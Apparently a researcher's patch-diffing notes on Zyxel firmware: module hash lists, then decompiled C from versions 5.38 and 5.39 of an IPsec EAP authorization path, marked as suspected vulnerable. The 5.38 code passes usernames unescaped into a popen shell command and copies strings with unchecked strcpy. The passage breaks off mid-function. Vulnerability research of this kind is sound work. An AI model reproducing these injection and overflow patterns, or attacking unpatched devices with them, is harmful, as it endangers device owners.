69f0531bdf20ff0aa22f96efe7c65f22c4b21d2fad4b45038f8133ab98c2b2f1  mod_proxy_hcheck.so
a98c63a6a8c2defd1bf46609faa64a75b859a5d76abb9299381fe8f1c243332e  mod_ratelimit.so
8ef442f37a0df76a0206b6b430175ce8fb0aa242cf20fd3ab700c6975af91b84  mod_remoteip.so
8edc3ea632d7383aa6f44c41148eb6038db84eb2ee64f01de8e5d0654c72cc26  mod_request.so
850739612e57e8f901b0436124ddd88d13d90fad8efd16e896224e7efe757ca9  mod_rewrite.so
93fc70eb74468b4901879d24503220f836fec78369d09a62b6504b4a1eb258f1  mod_security2.so
c4057e6bac9493341a139da6b18ab95b42453f386c07841af720da227deaa152  mod_sed.so
e31ded960fc50e6689cabcaf178bdab33366d98eb8b4d53b9fe69985404b383a  mod_session_cookie.so
25bf861b146230a03d88d8de1b9bc55de40ba7ab1ac3ad1d48c4bc055b2567b6  mod_session_dbd.so
09499d487f9f89d2ed3de1782f97ddce3c6a2a7e5a4c2ff3734e770f930a14e6  mod_session.so
90f60cfdb2aa412b3fc63288d0d470e627f35eb1b435da4d3d0f13767da3a030  mod_slotmem_shm.so
cb1f2d48b9a36383b3d09958d399ebd8a37da1874984c84d4bf7e38a8e4839b4  mod_socache_memcache.so
ec0e02a54eecdabe6a2da65d5c2186478c32ff97c14764d87fac6f57a56084b3  mod_socache_redis.so
9c735bcbafc0b985b47ad2ac301ea340c21d7d21b2ee22f6f6160c623d214553  mod_speling.so
f39c28d8623965fde19a7f7abdb6b310a2727cb483cc6d67df80267e74de2b61  mod_substitute.so
ed392c5f20bf6af4e9aa2aa43bee816e432948dda013079b22e21a93e01609c4  mod_unique_id.so
4246a2b8477dd44f0a63d775d8709f74616863eca8a95e50a5e62ed8fa815ce4  mod_vhost_alias.so
4a28e870fe58dc3bef91a1cb14b297e2d3ee9fdf8a7fcfe5597841966ef54e75  mod_watchdog.so
47ad43a5564c8e6d1547834c37d1d745c2efa3fa45e4a6ec100eea2b79073763  httpd.exp
243909177c8220b0b5d61e14c0966527d0aad8dd02c41a71c0f548942895815f  mod_allowmethods.so
a855d02618b04adf94d672be7d73c04ac8af227710c04f8628b4674b4c523deb  mod_auth_digest.so
a162be34d3d4edc4c5f47986a0c45d26765b0a21f3e97aadbeca88c90529f26b  mod_auth_form.so
c1e2fa315dca45f7133468386d44f017fa79cbe5491cc33ebd91805c08dbcbec  mod_authn_anon.so
827d6ce164f42d7ae8ad1dbd445e6afce8aabcc6dfbec8c07b05c705a77c2533  mod_authn_dbd.so
60fd4cfef4f531d4aef9f82d895ca4cac9be6d86fabbc939061c536fc9b68383  mod_authn_dbm.so
4423bcb422147d7b2e7a3a001ddeea2d155955904ad180fa5fe299baf407d9e1  mod_authn_socache.so
01b7bcb97fd179b4d3c59ae93352eaf195b132e495544f17c688897d6e239450  mod_authz_dbd.so
027eacdf459d1b9545306b21199bd8b613e0d7f7da95df55dfee2edcacab5863  mod_authz_dbm.so
7071ce23a2acc3f1ab618c27e84e88283ca8ca56c099d67e6529a9ed456277f3  mod_authz_owner.so
40826b8d87f0962d514e610e816fa511aec6bd15fafba8e77d0fade36da0c707  mod_auth_zyxel.so
90c2fb5ec64dae201784a7d6750454f3511bcecd55b67341b7020b1f3d7eec06  mod_buffer.so
ba8c49a7150cb93224047ba64439461b3dd05c925a98b413cd40de8291bd6bd2  mod_cache_disk.so
c3d3ff55f5f045e9d21e86448690a71424bd7f83e8a0df4cb1f9b9fae5b8aab5  mod_cache.so
ed7d1bc0ae7311a9b9962cf0ed022888a8d76802de1a2ee6bca4c154753190df  mod_cache_socache.so
85f4e96adac757b7c77509c7615ca605baf8fde17c0f0583cb1bfa7b66da584f  mod_dav_fs.so
552895ffc26aef9d1ea0557f75afb35dc446ac32892bb7f385f87c19cf0dbdfa  mod_dav.so
ec3f73f2745c1f1f93b9ab160f0099b51aee4f25d980175a730ed9f51cc4d0fc  mod_dbd.so
a64bf94345360e554c3f59ff560a03ac23a70aafe70d3f8bb58c33df3c66eb90  mod_dumpio.so
628e2dbe3402013bab8d8fce4ab07ebbde647a0f495f13826eb474d63e0ae8a8  mod_ext_filter.so
a6483a5d0d58c0e38e43cf5c5ecad39cde9a227ee2ab5616213b230ba92b2fce  mod_file_cache.so
79f3bac8e25c7dee13b4b56bbb0597889a9243c1a2c9949a51c5208cc9afe149  mod_info.so
cee2f5261ced0e7f7bf4d0576b384040c58ed07cb6bd80710098f960aa1f7100  mod_log_debug.so
026404e4b6799e57a77c1767c9f1d807bd1728f020c2db93e0e6619bc26b32ff  mod_logio.so
1e231ad7c911a0eef1b5a8b4b4df44a68b27e9cd6b9dfc6611dbff305a76123d  mod_macro.so
69f0531bdf20ff0aa22f96efe7c65f22c4b21d2fad4b45038f8133ab98c2b2f1  mod_proxy_hcheck.so
a98c63a6a8c2defd1bf46609faa64a75b859a5d76abb9299381fe8f1c243332e  mod_ratelimit.so
8ef442f37a0df76a0206b6b430175ce8fb0aa242cf20fd3ab700c6975af91b84  mod_remoteip.so
8edc3ea632d7383aa6f44c41148eb6038db84eb2ee64f01de8e5d0654c72cc26  mod_request.so
850739612e57e8f901b0436124ddd88d13d90fad8efd16e896224e7efe757ca9  mod_rewrite.so
b1c78cbfc5ad3402c6b85fc0955cb29e73235db34ef00ce19001e79598d336fe  mod_security2.so
c4057e6bac9493341a139da6b18ab95b42453f386c07841af720da227deaa152  mod_sed.so
e31ded960fc50e6689cabcaf178bdab33366d98eb8b4d53b9fe69985404b383a  mod_session_cookie.so
25bf861b146230a03d88d8de1b9bc55de40ba7ab1ac3ad1d48c4bc055b2567b6  mod_session_dbd.so
09499d487f9f89d2ed3de1782f97ddce3c6a2a7e5a4c2ff3734e770f930a14e6  mod_session.so
90f60cfdb2aa412b3fc63288d0d470e627f35eb1b435da4d3d0f13767da3a030  mod_slotmem_shm.so
cb1f2d48b9a36383b3d09958d399ebd8a37da1874984c84d4bf7e38a8e4839b4  mod_socache_memcache.so
ec0e02a54eecdabe6a2da65d5c2186478c32ff97c14764d87fac6f57a56084b3  mod_socache_redis.so
9c735bcbafc0b985b47ad2ac301ea340c21d7d21b2ee22f6f6160c623d214553  mod_speling.so
f39c28d8623965fde19a7f7abdb6b310a2727cb483cc6d67df80267e74de2b61  mod_substitute.so
ed392c5f20bf6af4e9aa2aa43bee816e432948dda013079b22e21a93e01609c4  mod_unique_id.so
4246a2b8477dd44f0a63d775d8709f74616863eca8a95e50a5e62ed8fa815ce4  mod_vhost_alias.so
4a28e870fe58dc3bef91a1cb14b297e2d3ee9fdf8a7fcfe5597841966ef54e75  mod_watchdog.so
```

out:

```
mod_security2.so
```

# sshipsecpm diff

疑似存在漏洞点的函数：

5.38:
```c

__int64 __fastcall sub_100DDBC8(int a1, int a2, int *a3)
{
  __int64 v3; // $v0
  __int64 v4; // $v0
  __int64 v5; // $v0
  __int64 v6; // $v0
  __int64 v7; // $v0
  __int64 v8; // $v0
  __int64 v9; // $v0
  __int64 v10; // $v0
  char *v11; // $s0
  const char *v12; // $v0
  __int64 v13; // $v0
  char *v14; // $s0
  const char *v15; // $v0
  __int64 v16; // $v0
  char *v17; // $s0
  const char *v18; // $v0
  __int64 v19; // $v0
  char *v20; // $s0
  const char *v21; // $v0
  __int64 v22; // $v0
  int v23; // $s0
  __int64 v24; // $v0
  int v25; // $s0
  int v26; // $s0
  __int64 v27; // $v0
  __int64 v28; // $v0
  __int64 v29; // $v0
  __int64 result; // $v0
  __int64 v31; // [sp+8h] [+8h]
  int v32; // [sp+30h] [+30h]
  int v33; // [sp+34h] [+34h]
  unsigned int v35; // [sp+3Ch] [+3Ch]
  int v36; // [sp+40h] [+40h]
  int v37; // [sp+44h] [+44h] BYREF
  int v38; // [sp+48h] [+48h] BYREF
  int v39; // [sp+50h] [+50h]
  int v40; // [sp+54h] [+54h]
  int *v41; // [sp+58h] [+58h]

  v39 = a1;
  v40 = a2;
  v41 = a3;
  v32 = 24;
  v35 = a3[3];
  v37 = 0;
  v38 = 0;
  v33 = 0;
  if ( ((*((_QWORD *)a3 + 5) >> 61) & 1LL) << 61 )
  {
    if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
    {
      v3 = sub_1028B07C("eap client need authorized?");
      sub_1028DB18(
        7LL,
        (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
        1766LL,
        (int)"SshPmIkeEapPAD",
        (int)"pm_ike_eap_authorization_cb",
        v3);
    }
    sub_1028F550(13LL, 12LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, "eap client need authorized?");
  }
  else
  {
    if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
    {
      v4 = sub_1028B07C(
             "allowed_user: %s user_type: %s id_data: %s",
             *(int *)(a3[2] + 40),
             *(int *)(a3[2] + 44),
             *(int *)(*(_DWORD *)(v35 + 384) + 8));
      sub_1028DB18(
        7LL,
        (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
        1771LL,
        (int)"SshPmIkeEapPAD",
        (int)"pm_ike_eap_authorization_cb",
        v4);
    }
    if ( v35 && !*(_DWORD *)(v35 + 248) )
    {
      *(_DWORD *)(v35 + 248) = sub_1029725C(
                                 1LL,
                                 496LL,
                                 (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
                                 1775LL);
      strcpy(*(char **)(v35 + 248), *(const char **)(a3[2] + 40));
      strcpy((char *)(*(_DWORD *)(v35 + 248) + 32), *(const char **)(a3[2] + 44));
      strcpy((char *)(*(_DWORD *)(v35 + 248) + 64), *(const char **)(*(_DWORD *)(v35 + 384) + 8));
      *(_DWORD *)(*(_DWORD *)(v35 + 248) + 192) = 0;
      *(_DWORD *)(*(_DWORD *)(v35 + 248) + 324) = 0;
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v5 = sub_1028B07C("server ip: %@", (int)sub_102BDC00, *(_DWORD *)v35 + 8);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1783LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v5);
      }
      memcpy((void *)(*(_DWORD *)(v35 + 248) + 196), (const void *)(*(_DWORD *)v35 + 8), 0x18u);
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v6 = sub_1028B07C("remote ip: %@", (int)sub_102BDC00, (int)(v35 + 4));
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1785LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v6);
      }
      memcpy((void *)(*(_DWORD *)(v35 + 248) + 220), (const void *)(v35 + 4), 0x18u);
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v7 = sub_1028B07C("local port: %d", *(unsigned __int16 *)(*(_DWORD *)v35 + 32));
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1787LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v7);
      }
      *(_WORD *)(*(_DWORD *)(v35 + 248) + 244) = *(_WORD *)(*(_DWORD *)v35 + 32);
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v8 = sub_1028B07C("remote port: %d", *(unsigned __int16 *)(v35 + 28));
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1789LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v8);
      }
      *(_WORD *)(*(_DWORD *)(v35 + 248) + 246) = *(_WORD *)(v35 + 28);
      if ( sub_1018EB60(*a3) && sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v9 = sub_1018EB60(*a3);
        v10 = sub_1028B07C("zy_real_name: %s", v9);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1794LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v10);
      }
      if ( sub_1018EC08(*a3) )
      {
        v11 = (char *)(*(_DWORD *)(v35 + 248) + 260);
        v12 = (const char *)sub_1018EC08(*a3);
        strcpy(v11, v12);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v35 + 248) + 260) = 0;
      }
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v13 = sub_1028B07C("authmodule: %s", *(_DWORD *)(v35 + 248) + 260);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1801LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v13);
      }
      if ( sub_1018ECC0(*a3) )
      {
        v14 = (char *)(*(_DWORD *)(v35 + 248) + 292);
        v15 = (const char *)sub_1018ECC0(*a3);
        strcpy(v14, v15);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v35 + 248) + 292) = 0;
      }
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v16 = sub_1028B07C("server_type: %s", *(_DWORD *)(v35 + 248) + 292);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1808LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v16);
      }
      if ( sub_1018ED78(*a3) )
      {
        v17 = (char *)(*(_DWORD *)(v35 + 248) + 344);
        v18 = (const char *)sub_1018ED78(*a3);
        strcpy(v17, v18);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v35 + 248) + 344) = 0;
      }
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v19 = sub_1028B07C("mobile: %s", *(_DWORD *)(v35 + 248) + 344);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1815LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v19);
      }
      if ( sub_1018EE30(*a3) )
      {
        v20 = (char *)(*(_DWORD *)(v35 + 248) + 376);
        v21 = (const char *)sub_1018EE30(*a3);
        strcpy(v20, v21);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v35 + 248) + 376) = 0;
      }
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v22 = sub_1028B07C("email: %s", *(_DWORD *)(v35 + 248) + 376);
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1821LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v22);
      }
      v23 = *(_DWORD *)(v35 + 248);
      *(_DWORD *)(v23 + 256) = sub_1012C644(v23 + 292);
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
      {
        v24 = sub_1028B07C("authmodule value: %d", *(int *)(*(_DWORD *)(v35 + 248) + 256));
        sub_1028DB18(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1825LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v24);
      }
      LODWORD(v31) = *(_DWORD *)(*(_DWORD *)(v35 + 248) + 192);
      sub_1028F550(
        13LL,
        12LL,
        0LL,
        0LL,
        0LL,
        0LL,
        0LL,
        0LL,
        "unique_id: %d zy_real_name: %s authmodule: %s server_type: %s authmodule value: %d",
        v31,
        (const char *)(*(_DWORD *)(v35 + 248) + 64),
        (const char *)(*(_DWORD *)(v35 + 248) + 260),
        (const char *)(*(_DWORD *)(v35 + 248) + 292),
        *(_DWORD *)(*(_DWORD *)(v35 + 248) + 256));
      v25 = *(_DWORD *)(v35 + 248);
      *(_DWORD *)(v25 + 252) = sub_1018EF90(*a3);
      v26 = *(_DWORD *)(v35 + 248);
      *(_DWORD *)(v26 + 248) = sub_1018EEE8(*a3);
      if ( strcmp(*(const char **)(a3[2] + 40), "any") )
        v33 = sub_1012D050(*(_DWORD *)(v35 + 248), "check-user");
      if ( v33 )
      {
        *(_WORD *)(v35 + 244) = *(_WORD *)(v35 + 244) & 0xFEFF | 0x100;
        if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 7) )
        {
          v27 = sub_1028B07C("check user rejected: %d", (*(_QWORD *)(v35 + 240) >> 24) & 1LL);
          sub_1028DB18(
            7LL,
            (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
            1843LL,
            (int)"SshPmIkeEapPAD",
            (int)"pm_ike_eap_authorization_cb",
            v27);
        }
        sub_1007410C(0LL, 0LL, a3[3], (int)"EAP authorize not allowd");
        sub_100E58F8((int)v35, 0LL, *(_DWORD *)(v35 + 248) + 64, 0LL);
        sub_100D9290((int)a3);
      }
    }
  }
  v36 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a3[3] + 932) + 8) + 32);
  if ( v36 )
    sub_1028F690(
      *(int *)(v36 + 12) == -18779795LL,
      (int)"(qm) && (qm)->magic == 0xfee1716d",
      (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
      1858LL,
      (int)"SshPmIkeEapPAD",
      (int)"pm_ike_eap_authorization_cb",
      2LL);
  if ( v36 && *(_DWORD *)(v36 + 912) )
  {
    if ( *(_DWORD *)(v35 + 408) )
      sub_10297DEC(*(int *)(v35 + 408), (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c", 1865LL);
    *(_DWORD *)(v35 + 408) = 0;
    if ( v40 )
      *(_DWORD *)(v35 + 408) = sub_1029837C(v39, 4 * v40);
    *(_DWORD *)(v35 + 412) = v40;
    *(_WORD *)(v35 + 364) = *(_WORD *)(v35 + 364) & 0xFFEF | 0x10;
    if ( sub_1006B94C((int)v35, *(int *)(v36 + 912)) )
    {
      sub_10173CC0(*a3, (int)&v37, (int)&v38);
      if ( !v37 && sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 5) )
      {
        v29 = sub_1028B07C("This EAP method does not return a key");
        sub_1028DB18(
          5LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1888LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v29);
      }
      v32 = 0;
    }
    else
    {
      if ( sub_1028B0F0() && sub_1028B130((int)"SshPmIkeEapPAD", 3) )
      {
        v28 = sub_1028B07C("Authorization failed; access groups did not match");
        sub_1028DB18(
          3LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1878LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v28);
      }
      *(_DWORD *)(*(_DWORD *)(v35 + 932) + 348) |= 0x20u;
    }
  }
  ((void (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))a3[34])(v32, v37, v38, a3[35]);
  sub_102AA31C((int)(a3 + 36));
  a3[34] = 0;
  result = (int)a3;
  a3[35] = 0;
  return result;
}

__int64 __fastcall sub_1012C81C(char *a1, char *a2, char *a3)
{
  __int64 v3; // $v0
  __int64 v4; // $v0
  __int64 v5; // $v0
  __int64 v6; // $v0
  __int64 v7; // $v0
  __int64 v8; // $v0
  int v10; // [sp+0h] [+0h]
  FILE *stream; // [sp+4h] [+4h]
  char v12[512]; // [sp+8h] [+8h] BYREF
  char v13[2048]; // [sp+208h] [+208h] BYREF
  char v14[168]; // [sp+A08h] [+A08h] BYREF
  char *v15; // [sp+AB0h] [+AB0h]
  char *v16; // [sp+AB4h] [+AB4h]
  char *v17; // [sp+AB8h] [+AB8h]

  v15 = a1;
  v16 = a2;
  v17 = a3;
  v10 = 0;
  stream = 0;
  if ( a1 && v16 && v17 )
  {
    if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 7LL) )
    {
      v4 = sub_1028B07C("user_name: %s, allowed_user: %s, allowed_user_type: %s", (int)v15, (int)v16, (int)v17);
      sub_1028DB18(
        7LL,
        (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
        182LL,
        (int)"ZyUtilPam",
        (int)"zy_ssh_pm_l2tp_check_allowed_user",
        v4);
    }
    if ( strcmp(v17, "user") )
    {
      if ( sub_10460B28((int)"/tmp/zld_group_database", (int)v14) )
      {
        v10 = -1;
      }
      else
      {
        sub_10293E38(
          (int)v12,
          512LL,
          "/bin/cat %s | grep -e '^%s#' | grep -e '#%s[,]'",
          (int)"/tmp/zld_group_database",
          (int)v16,
          (int)v15);
        if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 7LL) )
        {
          v6 = sub_1028B07C("zysh cmd: %s", (int)v12);
          sub_1028DB18(
            7LL,
            (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
            204LL,
            (int)"ZyUtilPam",
            (int)"zy_ssh_pm_l2tp_check_allowed_user",
            v6);
        }
        stream = popen(v12, "r");
        if ( stream )
        {
          if ( !fgets(v13, 2048, stream) )
          {
            if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 3LL) )
            {
              v8 = sub_1028B07C("allowed user is not matched (group mode)");
              sub_1028DB18(
                3LL,
                (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
                216LL,
                (int)"ZyUtilPam",
                (int)"zy_ssh_pm_l2tp_check_allowed_user",
                v8);
            }
            v10 = -1;
          }
        }
        else
        {
          if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 3LL) )
          {
            v7 = sub_1028B07C("pipe open zysh has failed");
            sub_1028DB18(
              3LL,
              (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
              209LL,
              (int)"ZyUtilPam",
              (int)"zy_ssh_pm_l2tp_check_allowed_user",
              v7);
          }
          v10 = -2;
        }
      }
    }
    else if ( strcmp(v16, v15) )
    {
      if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 3LL) )
      {
        v5 = sub_1028B07C("allowed user is not matched (user mode)");
        sub_1028DB18(
          3LL,
          (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
          188LL,
          (int)"ZyUtilPam",
          (int)"zy_ssh_pm_l2tp_check_allowed_user",
          v5);
      }
      v10 = -1;
    }
  }
  else
  {
    if ( sub_1028B0F0() && sub_1028B130((int)"ZyUtilPam", 3LL) )
    {
      v3 = sub_1028B07C("wrong parameters");
      sub_1028DB18(
        3LL,
        (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
        177LL,
        (int)"ZyUtilPam",
        (int)"zy_ssh_pm_l2tp_check_allowed_user",
        v3);
    }
    v10 = -1;
  }
  if ( stream )
    pclose(stream);
  return v10;
}

__int64 __fastcall sub_100739B0(char *a1)
{
  int v1; // $v0
  int v3; // [sp+0h] [+0h]
  int errcode; // [sp+8h] [+8h]
  regex_t v5; // [sp+10h] [+10h] BYREF
  regmatch_t v6; // [sp+30h] [+30h] BYREF
  char v7[264]; // [sp+38h] [+38h] BYREF
  char *string; // [sp+140h] [+140h]

  string = a1;
  v1 = regcomp(&v5, "[a-zA-Z_-][a-zA-Z0-9@\\._-]{0,30}", 1);
  sub_1028F690(
    v1 == 0LL,
    (int)"value == 0",
    (int)"../../../ipsec/quicksec/policymanager/util_render.c",
    33LL,
    (int)"SshPmUtilRender",
    (int)"zy_valid_username",
    2LL);
  errcode = regexec(&v5, string, 1u, &v6, 0);
  if ( errcode == 1LL )
  {
    sub_1028E948("no match username\n");
    v3 = 0;
  }
  else if ( errcode )
  {
    regerror(errcode, &v5, v7, 0x100u);
    sub_1028E948("decode error: %s\n", (int)v7);
    v3 = 0;
  }
  else
  {
    v3 = 1;
  }
  regfree(&v5);
  return v3;
}
```

5.39:
```c
__int64 __fastcall sub_100DDC08(int a1, int a2, int *a3)
{
  __int64 v3; // $v0
  __int64 v4; // $v0
  __int64 v5; // $v0
  __int64 v6; // $v0
  __int64 v7; // $v0
  __int64 v8; // $v0
  __int64 v9; // $v0
  __int64 v10; // $v0
  __int64 v11; // $v0
  char *v12; // $s0
  const char *v13; // $v0
  __int64 v14; // $v0
  char *v15; // $s0
  const char *v16; // $v0
  __int64 v17; // $v0
  char *v18; // $s0
  const char *v19; // $v0
  __int64 v20; // $v0
  char *v21; // $s0
  const char *v22; // $v0
  __int64 v23; // $v0
  int v24; // $s0
  __int64 v25; // $v0
  int v26; // $s0
  int v27; // $s0
  __int64 v28; // $v0
  __int64 v29; // $v0
  __int64 v30; // $v0
  __int64 result; // $v0
  __int64 v32; // [sp+8h] [+8h]
  int v33; // [sp+30h] [+30h]
  int v34; // [sp+34h] [+34h]
  unsigned int v36; // [sp+3Ch] [+3Ch]
  int v37; // [sp+40h] [+40h]
  int v38; // [sp+44h] [+44h] BYREF
  int v39; // [sp+48h] [+48h] BYREF
  int v40; // [sp+50h] [+50h]
  int v41; // [sp+54h] [+54h]
  int *v42; // [sp+58h] [+58h]

  v40 = a1;
  v41 = a2;
  v42 = a3;
  v33 = 24;
  v36 = a3[3];
  v38 = 0;
  v39 = 0;
  v34 = 0;
  if ( ((*((_QWORD *)a3 + 5) >> 61) & 1LL) << 61 )
  {
    if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
    {
      v3 = sub_1028B1CC("eap client need authorized?");
      sub_1028DC68(
        7LL,
        (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
        1766LL,
        (int)"SshPmIkeEapPAD",
        (int)"pm_ike_eap_authorization_cb",
        v3);
    }
    sub_1028F6A0(13LL, 12LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, "eap client need authorized?");
  }
  else if ( *(_DWORD *)(v36 + 384) )
  {
    if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
    {
      v5 = sub_1028B1CC(
             "allowed_user: %s user_type: %s id_data: %s",
             *(int *)(a3[2] + 40),
             *(int *)(a3[2] + 44),
             *(int *)(*(_DWORD *)(v36 + 384) + 8));
      sub_1028DC68(
        7LL,
        (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
        1775LL,
        (int)"SshPmIkeEapPAD",
        (int)"pm_ike_eap_authorization_cb",
        v5);
    }
    if ( v36 && !*(_DWORD *)(v36 + 248) )
    {
      *(_DWORD *)(v36 + 248) = sub_102973AC(
                                 1LL,
                                 496LL,
                                 (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
                                 1779LL);
      strcpy(*(char **)(v36 + 248), *(const char **)(a3[2] + 40));
      strcpy((char *)(*(_DWORD *)(v36 + 248) + 32), *(const char **)(a3[2] + 44));
      strcpy((char *)(*(_DWORD *)(v36 + 248) + 64), *(const char **)(*(_DWORD *)(v36 + 384) + 8));
      *(_DWORD *)(*(_DWORD *)(v36 + 248) + 192) = 0;
      *(_DWORD *)(*(_DWORD *)(v36 + 248) + 324) = 0;
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v6 = sub_1028B1CC("server ip: %@", (int)sub_102BDD50, *(_DWORD *)v36 + 8);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1787LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v6);
      }
      memcpy((void *)(*(_DWORD *)(v36 + 248) + 196), (const void *)(*(_DWORD *)v36 + 8), 0x18u);
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v7 = sub_1028B1CC("remote ip: %@", (int)sub_102BDD50, (int)(v36 + 4));
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1789LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v7);
      }
      memcpy((void *)(*(_DWORD *)(v36 + 248) + 220), (const void *)(v36 + 4), 0x18u);
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v8 = sub_1028B1CC("local port: %d", *(unsigned __int16 *)(*(_DWORD *)v36 + 32));
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1791LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v8);
      }
      *(_WORD *)(*(_DWORD *)(v36 + 248) + 244) = *(_WORD *)(*(_DWORD *)v36 + 32);
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v9 = sub_1028B1CC("remote port: %d", *(unsigned __int16 *)(v36 + 28));
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1793LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v9);
      }
      *(_WORD *)(*(_DWORD *)(v36 + 248) + 246) = *(_WORD *)(v36 + 28);
      if ( sub_1018ECB0(*a3) && sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v10 = sub_1018ECB0(*a3);
        v11 = sub_1028B1CC("zy_real_name: %s", v10);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1798LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v11);
      }
      if ( sub_1018ED58(*a3) )
      {
        v12 = (char *)(*(_DWORD *)(v36 + 248) + 260);
        v13 = (const char *)sub_1018ED58(*a3);
        strcpy(v12, v13);
      }
      else
      {
